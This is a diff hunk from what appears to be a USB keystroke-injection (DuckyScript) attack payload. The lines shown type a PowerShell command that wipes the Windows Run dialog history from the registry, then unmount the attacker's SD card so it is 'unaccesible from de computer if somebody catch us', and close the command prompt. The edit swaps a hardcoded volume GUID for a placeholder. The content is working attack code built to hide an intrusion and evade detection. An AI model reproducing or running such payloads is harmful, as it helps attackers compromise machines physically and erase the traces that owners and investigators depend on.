@@ -33,9 +33,9 @@ REM Clear the Run history
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
 DELAY 50
-REM We unmount de SD card for be unaccesible from de computer if somebody catch us (you can mount in your computer after the attack with 'mountvol D: (and here your volume, you can know the volume tag with the command 'mountvol')'.
-REM Change this "\\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\" with your volume tag, you can know it with the command 'mountvol'.
-STRING mountvol \\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\ /p
+REM We unmount de SD card for be unaccesible from de computer if somebody catch us (you can mount in your computer after the attack with 'mountvol D: (and here your volume id, you can know it with the command 'mountvol')'.
+REM Change this "\\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\" with your volume id, you can know it with the command 'mountvol'.
+STRING mountvol \\?\Volume{VOLUME_UUID}\ /p
 ENTER
 DELAY 100
 REM After the unmount, we will not need the command prompt more, so we close it.
